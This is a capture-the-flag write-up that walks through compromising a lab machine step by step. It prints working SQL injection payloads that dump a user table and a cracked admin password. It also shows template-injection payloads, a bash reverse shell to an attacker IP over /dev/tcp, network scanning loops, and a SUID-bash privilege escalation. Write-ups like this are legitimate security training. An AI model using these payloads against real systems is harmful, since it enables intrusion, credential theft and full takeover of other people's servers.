1. Run nmap to discover some open ports and services from the web server and we discover only port 80 is opened.
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/d2d3c3a8-cd52-4a27-8e35-781f1e1601e8)

2. Open the web server and it shows game website.
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/e8d730b1-bb7a-442a-8f1c-b74f7b56cb75)

3. Use feroxbuster to discover any interesting directories and files.
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/91f1129b-c3d3-49d1-aead-889a0efe4cf1)

4. Checking one by one features and try to do login in the web server.<br>
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/7b591e64-73fe-4d67-bb51-112afba6d914)

5. First thing that i thought is SQLi vulnerability, so let's try input ` ' OR 1=1 -- ` and it works by returning message Login Success!
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/77f3a7ac-2b28-4754-85cb-79f211581c99)

6. Send request to the web server and we successfully login as admin.
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/b5b3a103-1b1f-4ca8-a7e3-4313b9a6dc99)
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/8ef1ce50-c2c7-44bc-9a71-8aba2818b7bf)

7. There is change password in there (we'll use it later) but unfortunately it returns error 500.
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/3c56b94b-08dc-4249-8e6b-f8ddc1048e3b)

8. Now we must find the admin credentials. We use union-based injection and try one by one until it says login successful. In the photo we can discover that the last number (from 4) are being executed by the system. 
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/eeefc260-420d-4105-b104-533f28bd9cfc)

9. The first objective is to find what database is stored inside the web server. To do that, we can execute this payload `' UNION SELECT 0,1,2,concat(schema_name, ' ') FROM information_schema.schemata -- `
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/fa714b38-ea20-4aac-9264-6207c61147d0)

10. Realize that only 2 databases inside the web server and the main focus is the **main** database. Next we want to find the table content inside the database with this payload `' UNION SELECT 0,1,2,concat(table_name, ' ') FROM information_schema.tables where table_schema = 'main' -- `
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/4b9261db-bf96-47ed-9b76-faf2ffc7f871)

11. There are 3 tables inside the main database and we directly refer to user table. Before accessing that, we must know what column that are set in the table with this payload `' UNION SELECT 0,1,2,concat(column_name, ' ') FROM information_schema.columns where table_name = 'user' -- `
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/cced2234-0e0f-409d-a95f-62d1e5a0a134)

12.The columns are known and we just directly grab the data with this payload `' UNION SELECT 0,1,2,concat(id, ' ', email, ' ', password, ' ', name) FROM user -- `
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/36b99644-78dc-4559-bc85-641db664ecca)<br>

Admin user data:
id = 1
email = admin@goodgames.htb 
password (hash) = 2b22337f218b2d82dfc3b6f77e7cb8ec 
name = admin

13.Seems like the password been hashed using md5, so I use this [tool](https://crackstation.net/) to crack it and found that the password is **superadministrator**
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/78cee30f-8a4f-405f-9407-ceb5a3050453)

14. Next we are checking what the setting feature (Right corner above) can do. When I clicked, it directed to internal-administrator.htb but I can't access the web.
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/ac8b74f1-9f2d-49b6-93b4-f3ddeb1582b8)

15. Add internal-administrator.htb to /etc/hosts and you can open the website and needs to login.
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/177f04ed-62a5-49ad-ba6c-f53809d5413f)
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/533bd5c3-423b-40ee-b1ea-f30e9913641e)

16. Input admin credentials that have been found and directed to admin's dashboard page.
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/1c2a85f5-fb2b-4809-a0c4-21f38ce3f8b4)

17. From the web server name, it indicates to flask. The first thing related to flask is SSTI. In settings feature, we try to put this payload `{{ 6 * 8 }}`. If the output is 48, then it's vulnerable to SSTI.
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/28909249-72fc-4d34-b05c-1a7d6dee19a9)

18. Yep, it's vulnerable. We can execute the payload from this [source](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md) to execute bash command.

Payload:
`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`

![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/479fcc57-8e7d-43d0-bd09-c5a4244052f8)

19. It shows the information of admin's id which means it works. Next we're going to takeover the admin's shell with reverse shell attack and for the script you can make with this [tool] (https://www.revshells.com/)

Payload:
`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/10.10.14.13/777 0>&1"').read() }}`.

![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/6f4690ac-8ed4-4387-917b-7a5a9e3567a5)

![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/b1f2dc8c-d21e-49b3-b6be-0352a6b71d85)

20. We successfully access the admin's shell and get the user flag in /home/augustus/user.txt.
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/286e49ce-036c-4092-a1aa-36a8edac502e)

21. We know that this is already the root one, but we can't find the root flag here. Realize that we still have augustus account that haven't we check. To do that, first we must know his IP address using `ip a` command.
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/356ca1fd-9275-43d3-863c-03e51bde6235)

22. Knowing that all the ports in 172.19.0.2 are opened. Now we must find another address that opened or indicates that's augustus's shell. We can use loop in bash with this payload `for i in {1..254}; do (ping -c 1 172.19.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;`.
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/fa897b60-f5b2-476d-bd6e-c987c02f38f6)

23. The result is there are two open ports in 172.19.0.xxx. Next we check which ports are open in IP 172.19.0.1 with this command `for PORT in {0..1000}; do timeout 1 bash -c "</dev/tcp/172.19.0.1/$PORT &>/dev/null" 2>/dev/null && echo "$PORT is open"; done`.
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/63cf1510-f8eb-4f70-81e2-2f9499c4a7b1)

24. Unfortunately, the terminal doesn't have ssh access and we can't just access directly to augustus's shell because the partitions isn't mounted yet.<br>
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/c3c4ebcc-c92a-4a42-a7cc-b57012ff28f3)

25. To mount augustus's partitions (sda1) we can run `mount | grep augustus`.<br>
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/b61a79fa-c0b6-42e0-bceb-ae53e820411e)

26. Run `script /dev/null bash` to use the original bash (not user bash) and run `ssh augustus@172.19.0.1` where the password is **superadministrator** (the admin credential).<br>
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/62d79855-16b0-4ac0-9d8d-f2e9a3ccdd25)

27. Try to open the root and it says permission denied so we can't access it.
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/4a9034a3-b068-42c0-8572-a3244c09f496)

28. Next step is we need to copy augustus's bash terminal to root to see the privilege. We can run `ls -l bash` to check it and found that the UID must be 1000.<br> 
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/bafa8883-c1d9-4b48-baf7-ad99b6dcb39f)

29. We're accessing the root privilege so the bash owner must be controlled by root. We can use `chown root:root bash` to transfer file ownership to root and give all access with `chmod 7777`.<br>
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/cf7e95d0-43ee-4685-8541-24bec9d66531)

30. Open augustus's shell again with ssh and run the new privilege bash that has been settled in previous step with command `./bash -p`. There we get the root privilege and get the root flag in /root/root.txt.
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/2c494800-5f00-4d72-8cd9-0f370d48843c)


















































